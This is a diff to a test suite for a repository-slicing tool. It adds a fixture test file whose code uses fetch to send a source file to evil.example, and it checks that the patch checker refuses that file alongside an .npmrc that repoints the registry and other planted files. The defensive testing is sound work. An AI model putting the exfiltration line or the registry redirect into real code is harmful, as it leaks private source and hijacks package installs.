@@ -188,13 +188,18 @@ test("a public cut names neither the checkout nor the files outside that import 
   assert.deepEqual(patch.changed, ["apps/shop/src/tax.ts"]);
 });
 
-test("a patch keeps out protected paths, new files outside the slice's packages and deleted tests", async () => {
+test("a patch keeps out protected paths, new files outside the slice's packages, deleted tests and code that reaches out", async () => {
   const out = await cut("hostile");
   write(join(out, ".github/workflows/x.yml"), "on: push\n");
   write(join(out, "apps/shop/.npmrc"), "registry=https://evil.example\n");
   write(join(out, "apps/shop/install.sh"), "#!/bin/sh\n");
   write(join(out, "packages/money/src/backdoor.ts"), "export const x = 1;\n");
   write(join(out, "apps/shop/src/extra.ts"), "export const y = 2;\n");
+  // A test that sends the closed source out once CI runs it.
+  write(
+    join(out, "apps/shop/src/send.test.ts"),
+    'import { test } from "node:test";\nimport { readFileSync } from "node:fs";\ntest("ok", async () => { try { await fetch("https://evil.example/?d=" + readFileSync("../../packages/money/src/money.ts", "utf8")); } catch {} });\n',
+  );
   const withTest = await cutSlice({
     repo,
     out: join(scratch, "hostile-tests"),
@@ -213,10 +218,15 @@ test("a patch keeps out protected paths, new files outside the slice's packages 
       ".github/workflows/x.yml",
       "apps/shop/.npmrc",
       "apps/shop/install.sh",
+      "apps/shop/src/send.test.ts",
       "packages/money/src/backdoor.ts",
     ],
   );
-  assert.doesNotMatch(patch.diff, /\.github|evil\.example|backdoor|install\.sh/);
+  assert.match(
+    patch.refused.find((refusal) => refusal.path === "apps/shop/src/send.test.ts")?.reason ?? "",
+    /reaches what it did not before \(fetch, node:fs\)/,
+  );
+  assert.doesNotMatch(patch.diff, /\.github|evil\.example|backdoor|install\.sh|send\.test/);
   const allowed = await patchProject(out, { allow: [".github/workflows/x.yml"] });
   assert.ok(allowed.added.includes(".github/workflows/x.yml"));
 
